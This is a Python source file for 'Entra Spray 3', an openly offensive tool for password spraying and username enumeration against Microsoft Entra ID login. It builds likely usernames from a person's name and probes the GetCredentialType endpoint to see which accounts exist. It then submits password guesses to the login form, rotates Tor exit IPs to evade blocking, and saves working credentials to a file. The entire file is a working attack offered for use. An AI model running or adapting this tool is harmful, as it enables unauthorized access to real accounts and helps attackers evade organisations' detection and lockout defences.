#########################################################

# Entra Spray 3
# Written By Shaked Wiessman #
# Enjoy! #

import httpx
import re
import stem.control
import time
from urllib.parse import quote_plus, unquote, urlparse, parse_qs
import argparse
import os
import sys

# Colorsss
RESET = "\033[0m"
YELLOW = "\033[0;93m"
CYAN = "\033[0;36m"
BOLD_YELLOW = "\033[1;33m"
BOLD_RED = "\033[1;31m"
BOLD_GREEN = "\033[1;32m"

########################################################################
def load_list(input_str):
    if os.path.isfile(input_str):
        with open(input_str, "r") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [input_str]

########################################################################
def generate_combinations(firstname, lastname):
    combinations = set()
    f, l = firstname.lower(), lastname.lower()
    combos = [f, l, f + l, f + '.' + l, l + '.' + f, l + f, f + l[0], l + f[0],
              f + l[:2], f + l[:3], l + f[:2], l + f[:3], f[0] + l[0], l[0] + f[0],
              l[0] + '.' + f, f[0] + '.' + l, f + '.' + l[0], l + '.' + f[0]]
    for c in combos: combinations.add(c)
    return sorted(combinations)

########################################################################
def get_pageid_from_response(response_text):
    match = re.search(r'<meta\s+name="PageID"\s+content="([^"]+)"', response_text)
    return match.group(1) if match else None

########################################################################
########################################################################

parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-user", dest="user")
parser.add_argument("-password", dest="password")
parser.add_argument("-firstname", dest="firstname")
parser.add_argument("-lastname", dest="lastname")
parser.add_argument("-tenantname", dest="tenantname")
parser.add_argument("-check", action="store_true")
parser.add_argument("-proxytor", action="store_true")
args = parser.parse_args()

########################################################################

last_ip_renewal = time.time()
renew_interval = 240
transport = None

########################################################################
if args.proxytor:
    transport = httpx.HTTPTransport(proxy="socks5h://127.0.0.1:9050")
    print(f"{CYAN}[+] Using Proxy with TOR (127.0.0.1:9050){RESET}")

client = httpx.Client(transport=transport, timeout=30, http2=True, follow_redirects=False)

########################################################################
def renew_tor_ip():
    global last_ip_renewal
    try:
        with stem.control.Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(stem.Signal.NEWNYM)
            last_ip_renewal = time.time()
            print(f"{BOLD_YELLOW}[✓] Renewed TOR Public IP{RESET}")
            time.sleep(3)
            try:
                ip_res = client.get("https://check.torproject.org/api/ip")
                print(f"{YELLOW}[i] Current Public IP: {ip_res.text.strip()}{RESET}")
            except:
                print(f"{BOLD_RED}[!] Could not verify TOR IP{RESET}")
    except Exception as e:
        print(f"{BOLD_RED}[✗] Failed to renew TOR IP: {e}{RESET}")
########################################################################


usernames = load_list(args.user) if args.user else []
passwords = load_list(args.password) if args.password else []
if args.firstname and args.lastname and args.tenantname:
    combos = generate_combinations(args.firstname, args.lastname)
    usernames.extend([f"{c}@{args.tenantname}" for c in combos])

if args.proxytor: 
    renew_tor_ip()

########################################################################
try:
    for username in usernames:
        for password in (passwords if passwords else [""]):
            if args.proxytor and time.time() - last_ip_renewal >= renew_interval:
                renew_tor_ip()

            try:
               
                headers_login = {
                    "Host": "login.microsoftonline.com",
                    "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                    "Upgrade-Insecure-Requests": "1"
                }
                res1 = client.get("https://login.microsoftonline.com/", headers=headers_login)
                
              
                res2 = client.get("https://www.office.com/login")
                location = res2.headers.get("location")
                if not location: continue

               
                res3 = client.get(location + "&sso_reload=true")
                html = res3.text.replace("\\u0026", "&")
                
                flow_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', html)
                if not flow_match: continue
                flowtoken = flow_match.group(1)
                
                canary_match = re.search(r'"canary"\s*:\s*"([^"]+)"', html)
                if not canary_match: continue
                canary = canary_match.group(1)
                
                reset_match = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                if not reset_match: continue
                reset_url = reset_match.group()
                ctx = parse_qs(urlparse(unquote(reset_url).split("ru=", 1)[-1]).query).get("ctx", [None])[0]

              
                if args.check:
                    payload_exist = {"username": username, "flowToken": flowtoken}
                    res_exist = client.post("https://login.microsoftonline.com/common/GetCredentialType", json=payload_exist)
                    if '"IfExistsResult":0' in res_exist.text:
                        print(f"{BOLD_GREEN}[✓] Username: {username} exists{RESET}")
                    else:
                        print(f"{BOLD_RED}[✗] Username: {username} not found{RESET}")
                        continue

               
                if password:
                    current_cookies = dict(client.cookies)
                    current_cookies.update({
                        "AADSSO": "NA|NoExtension",
                        "SSOCOOKIEPULLED": "1",
                        "MicrosoftApplicationsTelemetryDeviceId": "31776052-89f1-4caf-82a2-4ccf2a9b7f37"
                    })
                    
                    auth_data = (
                        f"login={quote_plus(username)}&loginfmt={quote_plus(username)}&type=11&LoginOptions=3"
                        f"&passwd={quote_plus(password)}&canary={quote_plus(canary)}&ctx={quote_plus(ctx)}&flowToken={quote_plus(flowtoken)}"
                    )
                    
                    headers_auth = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
                    }
                    
                    res_auth = client.post("https://login.microsoftonline.com/common/login", headers=headers_auth, cookies=current_cookies, data=auth_data)
                    pageid = get_pageid_from_response(res_auth.text)
                    
                    if "ESTSAUTHPERSISTENT" in res_auth.cookies:
                        print(f"{BOLD_GREEN}[✓] {username}:{password} - Success! PageID: {pageid}{RESET}")
                        with open("valid-users.txt", "a") as f: f.write(f"{username}:{password}\n")
                        break
                    else:
                        print(f"{BOLD_RED}[✗] Failed: {username}:{password}{RESET}")

            except Exception as e:
                print(f"{BOLD_RED}[!] Error: {e}{RESET}")
                continue
finally:
    client.close()
